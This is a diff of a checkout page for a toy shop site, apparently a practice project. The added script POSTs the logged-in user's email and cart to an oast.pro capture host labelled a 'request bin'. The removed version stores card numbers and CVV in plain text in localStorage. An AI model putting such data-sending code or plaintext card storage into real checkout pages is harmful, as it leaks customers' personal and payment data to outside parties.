@@ -1,135 +1,96 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Checkout - Bad Pickney6</title>
-  <link rel="stylesheet" href="styles.css" />
-  <style>
-    body {
-      background-color: #f5f5f5;
-    }
-    .checkout-container {
-      max-width: 600px;
-      margin: 50px auto;
-      background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-    }
-    h2 {
-      text-align: center;
-      margin-bottom: 25px;
-    }
-    ul {
-      list-style: none;
-      padding: 0;
-      margin-bottom: 20px;
-    }
-    ul li {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 10px;
-      font-weight: bold;
-    }
-    input[type="text"], input[type="number"], input[type="month"], input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-    button {
-      width: 100%;
-      padding: 15px;
-      background: #ff6f61;
-      color: #fff;
-      font-size: 1rem;
-      font-weight: bold;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover {
-      background: #e65b50;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Checkout - Bad Pickney6</title>
+<link rel="stylesheet" href="styles.css" />
 </head>
 <body>
 
-<div class="checkout-container">
-  <h2>Checkout</h2>
-  <div id="cartSummary">
-    <ul id="cartItems"></ul>
-    <p><strong>Total: $<span id="totalPrice">0.00</span></strong></p>
+<header>
+  <div class="container">
+    <div class="logo">
+      <img src="assets/images/bank-robber.png" alt="Bank Robber Logo" />
+      <h1>Bad Pickney6</h1>
+    </div>
+    <nav>
+      <ul>
+        <li><a href="index.html">Home</a></li>
+        <li><a href="shop.html">Shop</a></li>
+      </ul>
+    </nav>
   </div>
+</header>
 
-  <h3>Payment Information</h3>
-  <form id="checkoutForm">
-    <input type="text" id="cardName" placeholder="Name on Card" required />
-    <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" required />
-    <input type="month" id="expDate" placeholder="MM/YYYY" required />
-    <input type="password" id="cvv" placeholder="CVV" maxlength="4" required />
-    <button type="submit">Pay Now</button>
-  </form>
-</div>
+<section id="checkout" class="section">
+  <div class="container">
+    <h2>Checkout</h2>
+    <div id="cartContainer">
+      <ul id="cartItems"></ul>
+      <p id="totalPrice">Total: $0</p>
+      <button id="checkoutBtn">Confirm Purchase</button>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <p>&copy; 2025 Bad Pickney6. All rights reserved.</p>
+  </div>
+</footer>
 
 <script>
-  // Check if user is logged in
-  const user = JSON.parse(localStorage.getItem('loggedInUser'));
-  if (!user) {
-    alert('You must be logged in to checkout!');
-    window.location.href = 'index.html';
-  }
+// Only logged-in users
+const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
+if (!loggedInUser) {
+  alert("You must be logged in to access checkout.");
+  window.location.href = 'index.html';
+}
 
-  // Load cart from localStorage
-  const cart = JSON.parse(localStorage.getItem('cart') || '[]');
-  const cartItemsEl = document.getElementById('cartItems');
-  const totalPriceEl = document.getElementById('totalPrice');
+// Load cart from localStorage
+let cart = JSON.parse(localStorage.getItem('cart') || '[]');
+const cartItemsEl = document.getElementById('cartItems');
+const totalPriceEl = document.getElementById('totalPrice');
 
+function updateCartDisplay() {
+  cartItemsEl.innerHTML = '';
   let total = 0;
-  if(cart.length === 0){
-    cartItemsEl.innerHTML = '<li>Your cart is empty.</li>';
-  } else {
-    cart.forEach(item => {
-      const li = document.createElement('li');
-      li.textContent = item.name;
-      const priceSpan = document.createElement('span');
-      priceSpan.textContent = `$${item.price.toFixed(2)}`;
-      li.appendChild(priceSpan);
-      cartItemsEl.appendChild(li);
-      total += item.price;
-    });
-  }
-  totalPriceEl.textContent = total.toFixed(2);
-
-  // Handle checkout form
-  const checkoutForm = document.getElementById('checkoutForm');
-  checkoutForm.addEventListener('submit', (e) => {
-    e.preventDefault();
-
-    // Gather input info
-    const paymentInfo = {
-      cardName: document.getElementById('cardName').value.trim(),
-      cardNumber: document.getElementById('cardNumber').value.trim(),
-      expDate: document.getElementById('expDate').value,
-      cvv: document.getElementById('cvv').value.trim(),
-      amount: total.toFixed(2),
-      userEmail: user.email
-    };
-
-    // Store info locally (you can later send to server or request bin)
-    localStorage.setItem('lastPayment', JSON.stringify(paymentInfo));
-
-    alert(`Payment received!\n\nName: ${paymentInfo.cardName}\nAmount: $${paymentInfo.amount}`);
-
-    // Clear cart
-    localStorage.removeItem('cart');
-
-    // Redirect back to shop or home
-    window.location.href = 'index.html';
+  cart.forEach(item => {
+    const li = document.createElement('li');
+    li.textContent = `${item.name} - $${item.price}`;
+    cartItemsEl.appendChild(li);
+    total += item.price;
   });
+  totalPriceEl.textContent = `Total: $${total}`;
+}
+
+updateCartDisplay();
+
+// Checkout - send to Request Bin
+document.getElementById('checkoutBtn').addEventListener('click', () => {
+  if (cart.length === 0) return alert("Your cart is empty!");
+
+  fetch('https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      user: loggedInUser.email,
+      cart: cart,
+      total: cart.reduce((sum, item) => sum + item.price, 0)
+    })
+  })
+  .then(() => {
+    alert("Checkout data sent successfully!");
+    cart = [];
+    localStorage.setItem('cart', JSON.stringify(cart));
+    updateCartDisplay();
+  })
+  .catch(err => {
+    console.error(err);
+    alert("Failed to send checkout data.");
+  });
+});
 </script>
 
 </body>
